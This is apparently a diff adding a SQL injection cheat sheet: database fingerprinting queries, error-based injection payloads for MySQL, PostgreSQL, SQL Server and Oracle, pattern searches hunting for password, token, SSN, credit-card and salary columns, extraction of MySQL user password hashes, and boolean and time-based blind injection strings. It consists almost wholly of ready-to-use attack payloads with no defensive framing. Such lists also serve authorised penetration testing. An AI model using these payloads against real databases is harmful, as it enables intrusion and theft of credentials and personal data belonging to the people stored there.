@@ -1,0 +1,305 @@
+SELECT user,host FROM mysql.user
+SELECT user() -- Current user
+SELECT current_user()
+SELECT schema()  -- Current database
+SELECT usename FROM pg_user
+SELECT current_user
+SELECT current_database()
+SELECT name FROM syslogins
+SELECT USER_NAME()
+SELECT DB_NAME()
+SELECT schema(), user(), @@version
+-- Tells you: current database, current user, database type
+SELECT schema_name FROM information_schema.schemata
+-- Shows all databases you can see
+SELECT table_name FROM information_schema.tables WHERE table_schema=schema()
+-- Shows tables in current database only
+SELECT DB_NAME()
+
+
+-- ===============================
+-- DATABASE DETECTION & VERSION
+-- ===============================
+
+-- MySQL
+SELECT VERSION()
+SELECT @@version
+SELECT @@version_comment
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT DATABASE()
+SELECT SCHEMA()
+
+-- PostgreSQL
+SELECT version()
+SELECT current_user
+SELECT current_database()
+SELECT current_schema()
+
+-- SQL Server
+SELECT @@version
+SELECT @@servername
+SELECT DB_NAME()
+SELECT USER_NAME()
+SELECT SYSTEM_USER
+
+-- Oracle
+SELECT banner FROM v$version
+SELECT user FROM dual
+SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
+
+-- SQLite
+SELECT sqlite_version()
+
+-- ===============================
+-- ERROR-BASED INJECTION PAYLOADS
+-- ===============================
+
+-- MySQL Error-Based
+SELECT extractvalue(1,concat(0x7e,(SELECT version()),0x7e))
+SELECT updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+SELECT (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),0x3a,database(),FLOOR(RAND(0)*2)))
+
+-- PostgreSQL Error-Based
+SELECT CAST((SELECT version()) AS int)
+SELECT CAST((SELECT current_database()) AS int)
+
+-- SQL Server Error-Based
+SELECT CONVERT(int,(SELECT @@version))
+SELECT CAST((SELECT db_name()) AS int)
+
+-- Oracle Error-Based
+SELECT CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1)) FROM dual
+
+-- ===============================
+-- TABLE ENUMERATION
+-- ===============================
+
+-- Basic Table Discovery
+SELECT table_name FROM information_schema.tables
+SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+SELECT table_name FROM information_schema.tables WHERE table_schema='public'
+
+-- PostgreSQL Specific
+SELECT tablename FROM pg_tables WHERE schemaname='public'
+
+-- SQL Server Specific
+SELECT name FROM sysobjects WHERE xtype='U'
+SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'
+
+-- Oracle Specific
+SELECT table_name FROM user_tables
+SELECT table_name FROM all_tables
+
+-- ===============================
+-- LIKE-BASED TABLE HUNTING
+-- ===============================
+
+-- User/Account Related Tables
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%account%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%member%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%customer%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%client%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%profile%'
+
+-- Authentication/Security Tables
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%auth%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%login%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%password%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%token%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%session%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%credential%'
+
+-- Administrative Tables
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%admin%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%role%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%permission%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%privilege%'
+
+-- Business/Application Tables
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%order%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%product%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%payment%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%transaction%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%invoice%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%financial%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%billing%'
+
+-- System/Log Tables
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%log%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%audit%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%history%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%backup%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%temp%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%cache%'
+
+-- Sensitive Data Tables
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%personal%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%private%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%secret%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%confidential%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%salary%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%employee%'
+
+-- Common Prefixes/Suffixes
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'tbl_%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'tb_%'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%_data'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%_info'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%_master'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%_detail'
+
+-- ===============================
+-- COLUMN ENUMERATION
+-- ===============================
+
+-- Basic Column Discovery
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'
+SELECT column_name,data_type,is_nullable FROM information_schema.columns WHERE table_name='users'
+
+-- ===============================
+-- LIKE-BASED COLUMN HUNTING
+-- ===============================
+
+-- Password/Authentication Columns
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pass%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pwd%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%hash%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%salt%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%token%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%secret%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%key%'
+
+-- User Identification Columns
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%user%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%login%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%email%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%username%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%account%'
+
+-- Administrative/Privilege Columns
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%admin%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%role%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%privilege%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%permission%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%level%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%status%'
+
+-- Personal/Sensitive Data Columns
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%ssn%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%social%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%credit%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%card%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%phone%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%address%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%salary%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%wage%'
+
+-- Financial Columns
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%price%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%amount%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%payment%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%balance%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%total%'
+
+-- Common ID/Foreign Key Patterns
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%_id'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE 'id_%'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%_key'
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%_ref'
+
+-- ===============================
+-- DATABASE ENUMERATION
+-- ===============================
+
+-- List All Databases
+SELECT schema_name FROM information_schema.schemata
+SELECT datname FROM pg_database
+SELECT name FROM sys.databases
+
+-- Database Pattern Hunting
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%prod%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%dev%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%test%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%backup%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%admin%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%internal%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%app%'
+SELECT schema_name FROM information_schema.schemata WHERE schema_name LIKE '%web%'
+
+-- ===============================
+-- USER/PRIVILEGE ENUMERATION
+-- ===============================
+
+-- MySQL Users
+SELECT user,host FROM mysql.user
+SELECT user,host,password FROM mysql.user
+SELECT grantee,privilege_type FROM information_schema.user_privileges
+
+-- PostgreSQL Users
+SELECT usename FROM pg_user
+SELECT rolname FROM pg_roles
+
+-- SQL Server Users
+SELECT name FROM syslogins
+SELECT name,type_desc FROM sys.server_principals
+
+-- ===============================
+-- ROW COUNTING & STATISTICS
+-- ===============================
+
+-- Count Rows in Tables
+SELECT COUNT(*) FROM users
+SELECT COUNT(*) FROM information_schema.tables
+SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users'
+
+-- Table Statistics
+SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema=database()
+
+-- ===============================
+-- ADVANCED LIKE COMBINATIONS
+-- ===============================
+
+-- Multiple Pattern Matching
+SELECT table_name FROM information_schema.tables 
+WHERE table_name LIKE '%user%' OR table_name LIKE '%admin%' OR table_name LIKE '%account%'
+
+-- Exclude System Tables
+SELECT table_name FROM information_schema.tables 
+WHERE table_name LIKE '%user%' AND table_name NOT LIKE 'mysql%'
+
+-- Case Insensitive Matching (MySQL)
+SELECT table_name FROM information_schema.tables WHERE LOWER(table_name) LIKE '%user%'
+
+-- Length-Specific Searches
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '____'  -- Exactly 4 chars
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'user____'  -- user + 4 chars
+
+-- Pattern Combinations
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user_%data'
+SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'tbl_%user%'
+
+-- ===============================
+-- BLIND SQL INJECTION TESTING
+-- ===============================
+
+-- Boolean-Based Existence Testing
+1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0
+1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0
+1 AND (SELECT LENGTH(database())) > 5
+
+-- Time-Based Testing
+1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0,SLEEP(5),0)
+
+-- ===============================
+-- COMMON TABLE NAMES TO TEST
+-- ===============================
+
+-- Users/Accounts: users, user, accounts, members, customers, clients, profiles
+-- Auth: login, auth, authentication, sessions, tokens, credentials
+-- Admin: admin, admins, administrators, roles, permissions, privileges  
+-- Business: orders, products, payments, transactions, invoices, billing
+-- Logs: logs, audit, history, events, activity
+-- System: config, settings, options, preferences, cache, temp
